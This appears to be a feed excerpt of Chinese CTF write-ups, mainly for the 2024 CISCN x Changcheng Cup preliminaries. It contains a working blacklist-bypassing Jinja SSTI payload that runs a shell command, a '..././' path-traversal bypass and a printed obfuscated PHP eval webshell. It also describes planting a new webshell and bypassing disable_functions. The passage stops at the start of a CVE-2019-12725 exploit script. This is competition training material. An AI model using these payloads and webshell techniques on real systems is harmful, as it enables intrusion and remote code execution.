AES.new(aes_key_decrypted, AES.MODE_EAX, nonce=nonce)</span><br><span class="line">    decrypted_data = de_aes.decrypt_and_verify(enc_data, tag)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES解密失败或验证失败：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解密后的数据写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decrypted_data.csv&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Successfully decrypted data&quot;</span>)</span><br></pre></td></tr></table></figure><p>解开得到csv，发现最后一列是加密的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154635827-1568790526.png" alt="image-20250303154631694"></p><p>个人签名是用的RC4加密的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154640984-1813266908.png" alt="image-20250303154637019"></p><p>写脚本解密，找到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;decrypted_data.csv&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> index, row <span class="keyword">in</span> data.iterrows():</span><br><span class="line">    encrypted = row[<span class="string">&#x27;个性签名(加密版)&#x27;</span>]</span><br><span class="line">    password = row[<span class="string">&#x27;密码&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    enc_de_base64 = base64.b64decode(encrypted)</span><br><span class="line">    rc4 = ARC4.new(password.encode())</span><br><span class="line">    de_rc4 = rc4.decrypt(enc_de_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;DASCTF&#123;&quot;</span> <span class="keyword">in</span> de_rc4:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;得到结果:<span class="subst">&#123;de_rc4&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202503/3051266-20250303154650065-1805009670.png" alt="image-20250303154646135"></p>]]></content>
    
    
    <summary type="html">第八届西湖论剑 初赛 WriteUp By 金石滩小鲨鱼</summary>
    
    
    
    <category term="Writeup" scheme="https://ya1orin.github.io/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://ya1orin.github.io/tags/CTF/"/>
    
    <category term="Competition" scheme="https://ya1orin.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>2024 CISCN x 长城杯铁人三项 初赛 WriteUp</title>
    <link href="https://ya1orin.github.io/posts/cbe4da55.html"/>
    <id>https://ya1orin.github.io/posts/cbe4da55.html</id>
    <published>2024-12-16T00:41:11.000Z</published>
    <updated>2024-12-25T11:56:57.315Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h2><p>题目一进去就给了源码,里面是一个简单的 ssti,但是无回显不出网</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, request, render_template_string</span><br><span class="line">import socket</span><br><span class="line">import threading</span><br><span class="line">import html</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def <span class="title function_ invoke__">source</span>():</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>+html.<span class="title function_ invoke__">escape</span>(f.<span class="title function_ invoke__">read</span>())+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_ invoke__">template</span>():</span><br><span class="line">    template_code = request.form.<span class="title function_ invoke__">get</span>(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="comment"># 安全过滤</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> black in blacklist:</span><br><span class="line">        <span class="keyword">if</span> black in template_code:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Forbidden content detected!&quot;</span></span><br><span class="line">    result = <span class="title function_ invoke__">render_template_string</span>(template_code)</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">if</span> result is not None <span class="keyword">else</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPProxyHandler</span>:</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>, <span class="title">target_host</span>, <span class="title">target_port</span>):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">target_host</span> = <span class="title">target_host</span></span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">target_port</span> = <span class="title">target_port</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">handle_request</span>(<span class="title">self</span>, <span class="title">client_socket</span>):</span></span><br><span class="line"><span class="class">        <span class="title">try</span>:</span></span><br><span class="line"><span class="class">            <span class="title">request_data</span> = <span class="title">b</span>&quot;&quot;</span></span><br><span class="line"><span class="class">            <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="class">                <span class="title">chunk</span> = <span class="title">client_socket</span>.<span class="title">recv</span>(4096)</span></span><br><span class="line"><span class="class">                <span class="title">request_data</span> += <span class="title">chunk</span></span></span><br><span class="line"><span class="class">                <span class="title">if</span> <span class="title">len</span>(<span class="title">chunk</span>) &lt; 4096:</span></span><br><span class="line"><span class="class">                    <span class="title">break</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">if</span> <span class="title">not</span> <span class="title">request_data</span>:</span></span><br><span class="line"><span class="class">                <span class="title">client_socket</span>.<span class="title">close</span>()</span></span><br><span class="line"><span class="class">                <span class="title">return</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">with</span> <span class="title">socket</span>.<span class="title">socket</span>(<span class="title">socket</span>.<span class="title">AF_INET</span>, <span class="title">socket</span>.<span class="title">SOCK_STREAM</span>) <span class="title">as</span> <span class="title">proxy_socket</span>:</span></span><br><span class="line"><span class="class">                <span class="title">proxy_socket</span>.<span class="title">connect</span>((<span class="title">self</span>.<span class="title">target_host</span>, <span class="title">self</span>.<span class="title">target_port</span>))</span></span><br><span class="line"><span class="class">                <span class="title">proxy_socket</span>.<span class="title">sendall</span>(<span class="title">request_data</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                <span class="title">response_data</span> = <span class="title">b</span>&quot;&quot;</span></span><br><span class="line"><span class="class">                <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="class">                    <span class="title">chunk</span> = <span class="title">proxy_socket</span>.<span class="title">recv</span>(4096)</span></span><br><span class="line"><span class="class">                    <span class="title">if</span> <span class="title">not</span> <span class="title">chunk</span>:</span></span><br><span class="line"><span class="class">                        <span class="title">break</span></span></span><br><span class="line"><span class="class">                    <span class="title">response_data</span> += <span class="title">chunk</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">header_end</span> = <span class="title">response_data</span>.<span class="title">rfind</span>(<span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>\<span class="title">r</span>\<span class="title">n</span>&quot;)</span></span><br><span class="line"><span class="class">            <span class="title">if</span> <span class="title">header_end</span> != -1:</span></span><br><span class="line"><span class="class">                <span class="title">body</span> = <span class="title">response_data</span>[<span class="title">header_end</span> + 4:]</span></span><br><span class="line"><span class="class">            <span class="title">else</span>:</span></span><br><span class="line"><span class="class">                <span class="title">body</span> = <span class="title">response_data</span></span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">            <span class="title">response_body</span> = <span class="title">body</span></span></span><br><span class="line"><span class="class">            <span class="title">response</span> = <span class="title">b</span>&quot;<span class="title">HTTP</span>/1.1 200 <span class="title">OK</span>\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;<span class="title">Content</span>-<span class="title">Length</span>: &quot; + <span class="title">str</span>(<span class="title">len</span>(<span class="title">response_body</span>)).<span class="title">encode</span>() + <span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;<span class="title">Content</span>-<span class="title">Type</span>: <span class="title">text</span>/<span class="title">html</span>; <span class="title">charset</span>=<span class="title">utf</span>-8\<span class="title">r</span>\<span class="title">n</span>&quot; \</span></span><br><span class="line"><span class="class">                       <span class="title">b</span>&quot;\<span class="title">r</span>\<span class="title">n</span>&quot; + <span class="title">response_body</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">client_socket</span>.<span class="title">sendall</span>(<span class="title">response</span>)</span></span><br><span class="line"><span class="class">        <span class="title">except</span> <span class="title">Exception</span> <span class="title">as</span> <span class="title">e</span>:</span></span><br><span class="line"><span class="class">            <span class="title">print</span>(<span class="title">f</span>&quot;<span class="title">Proxy</span> <span class="title">Error</span>: </span>&#123;e&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">        finally:</span></span><br><span class="line"><span class="string">            client_socket.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def start_proxy_server(host, port, target_host, target_port):</span></span><br><span class="line"><span class="string">    proxy_handler = HTTPProxyHandler(target_host, target_port)</span></span><br><span class="line"><span class="string">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line"><span class="string">    server_socket.bind((host, port))</span></span><br><span class="line"><span class="string">    server_socket.listen(100)</span></span><br><span class="line"><span class="string">    print(f&quot;</span>Proxy server is running on &#123;host&#125;:&#123;port&#125; <span class="keyword">and</span> forwarding to &#123;target_host&#125;:&#123;target_port&#125;...<span class="string">&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        while True:</span></span><br><span class="line"><span class="string">            client_socket, addr = server_socket.accept()</span></span><br><span class="line"><span class="string">            print(f&quot;</span>Connection <span class="keyword">from</span> &#123;addr&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))</span></span><br><span class="line"><span class="string">            thread.daemon = True</span></span><br><span class="line"><span class="string">            thread.start()</span></span><br><span class="line"><span class="string">    except KeyboardInterrupt:</span></span><br><span class="line"><span class="string">        print(&quot;</span>Shutting down proxy server...<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    finally:</span></span><br><span class="line"><span class="string">        server_socket.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def run_flask_app():</span></span><br><span class="line"><span class="string">    app.run(debug=False, host=&#x27;127.0.0.1&#x27;, port=5000)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;</span>__main__<span class="string">&quot;:</span></span><br><span class="line"><span class="string">    proxy_host = &quot;</span><span class="number">0.0</span>.<span class="number">0.0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    proxy_port = 5001</span></span><br><span class="line"><span class="string">    target_host = &quot;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    target_port = 5000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 安全反代，防止针对响应头的攻击</span></span><br><span class="line"><span class="string">    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))</span></span><br><span class="line"><span class="string">    proxy_thread.daemon = True</span></span><br><span class="line"><span class="string">    proxy_thread.start()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    print(&quot;</span>Starting Flask app...<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    run_flask_app()</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>直接本地启服务,设置回显让 fenjing 一把梭得出绕过黑名单的命令</p><p>一开始想复杂了,打算拿内存马打,之后又看到一篇<a href="https://xz.aliyun.com/t/16325?time__1311=GuD%3D0KAKYK7KiKDsD7%2Bd0%3D6RL%3DdGC3IztjeD#toc-2">基于错误页面的回显</a>,但是拿 fenjing 的 payload 梭不好使.打算自己本地手敲一个。</p><p>想尝试写文件的，但是页面还是会报错</p><p>后来又想到之前鹏程杯那道 python 题,也是无回显不出网,当时直接把 flag 写到 app.py 上,这次也试试看.</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084800322-1614287045.png" alt="image-20241216084748633"></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>gl%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;globals&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>bu%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;builtins&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>im%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">2</span>B<span class="string">&#x27;i&#x27;</span><span class="string">&#x27;mport&#x27;</span>%<span class="number">2</span>B<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">25</span>set%<span class="number">20</span>oe%<span class="number">3</span>D<span class="string">&#x27;so&#x27;</span>%<span class="number">5</span>B%<span class="number">3</span>A%<span class="number">3</span>A-<span class="number">1</span>%<span class="number">5</span>D%<span class="number">25</span>%<span class="number">7</span>D%<span class="number">7</span>B%<span class="number">7</span>Bg.pop%<span class="number">5</span>Bgl%<span class="number">5</span>D%<span class="number">5</span>Bbu%<span class="number">5</span>D%<span class="number">5</span>Bim%<span class="number">5</span>D(oe)%<span class="number">5</span>B<span class="string">&#x27;p&#x27;</span><span class="string">&#x27;open&#x27;</span>%<span class="number">5</span>D(<span class="string">&#x27;cat%20%2Fflag%20%3E%20app.py&#x27;</span>).<span class="title function_ invoke__">read</span>()%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084920779-735291526.png" alt="image-20241216084910073"></p><p>工具链接：<a href="https://github.com/Marven11/FenJing">https://github.com/Marven11/FenJing</a></p><p><code>flag&#123;9cb84d61-9040-47d7-b5ef-4c88ffa6e317&#125;</code></p><h2 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h2><p>这题一进去就是一个很可疑,带有文件包含的 url,查看源代码后更是有两个提示</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084927363-2098915863.png" alt="image-20241216084916854"></p><p>肯定是需要文件包含来读取这两个文件.</p><p>经过在 file 参数上的 fuzz,发现他限制长度13 过滤<code>php://</code>, <code>data</code> ,<code>input</code>,这样伪协议几乎是用不了</p><p>在尝试在 file 参数上进行目录穿越的时候发现<code>../</code>不被解析,然后<code>../</code>也没被 ban</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084932527-2092266536.png" alt="image-20241216084921904"></p><p>既然他 ban <code>../</code>的情况下,那么就是将<code>../</code>过滤了,尝试传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//eci-2zecjw6gho6wjsdwij1l.cloudeci1.ichunqiu.com/index.php?file=..././tips.php</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084940869-327419950.png" alt="image-20241216084930190"></p><p>之后访问 hackme.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$lJbGIY</span>=<span class="string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<span class="variable">$OlWYMv</span>=<span class="string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<span class="variable">$lapUCm</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$YwzIst</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;;<span class="variable">$OxirhK</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$YpAUWC</span>=<span class="variable">$OxirhK</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OxirhK</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$OxirhK</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$rVkKjU</span>=<span class="variable">$lapUCm</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">13</span>&#125;;<span class="variable">$YwzIst</span>.=<span class="variable">$lapUCm</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">36</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$lapUCm</span>&#123;<span class="number">30</span>&#125;;<span class="keyword">eval</span>(<span class="variable">$YwzIst</span>(<span class="string">&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>是一个混淆的代码,本地反混淆得到连接密码,直接蚁剑连接</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216084950610-1843665184.png" alt="image-20241216084939618"></p><p>由于前面的 tips.php 能看到 disable_function 禁用了许多危险函数,在 LFI 文件夹新建一个马</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085041869-313494412.png" alt="image-20241216085031196"></p><p>再次用蚁剑连接 a.php,并用插件来绕过 disable_fuction 即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085047825-286970171.png" alt="image-20241216085036873"></p><p>连接生成的<code>.antproxy.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085054238-2085140919.png" alt="image-20241216085043576"></p><p>通过 find 找到 flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085059272-25961471.png" alt="image-20241216085048690"></p><p><code>flag&#123;91a89c19-e322-4ceb-8789-0bbc09b033f5&#125;</code></p><h1 id="威胁检测与网络流量分析"><a href="#威胁检测与网络流量分析" class="headerlink" title="威胁检测与网络流量分析"></a>威胁检测与网络流量分析</h1><h2 id="zeroshell-1"><a href="#zeroshell-1" class="headerlink" title="zeroshell_1"></a>zeroshell_1</h2><p>直接CTF-NetA扫描，看见Referer。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085136211-1607001841.png" alt="image-20241216085125418"></p><p>直接Cyberchef解码，得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085204370-212498903.png" alt="image-20241216085153708"></p><p><code>flag&#123;6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A&#125;</code></p><h2 id="zeroshell-2"><a href="#zeroshell-2" class="headerlink" title="zeroshell_2"></a>zeroshell_2</h2><p>根据手册搭建环境，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085229026-1094870602.png" alt="image-20241216085218365"></p><p>然后去网上搜zeroshell的exp直接搜到CVE-2019-12725随便找一个exp。我找的这个<a href="https://gryffinbit.top/2022/11/16/ZeroShell-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CVE-2019-12725/">CVE-2019-12725</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span 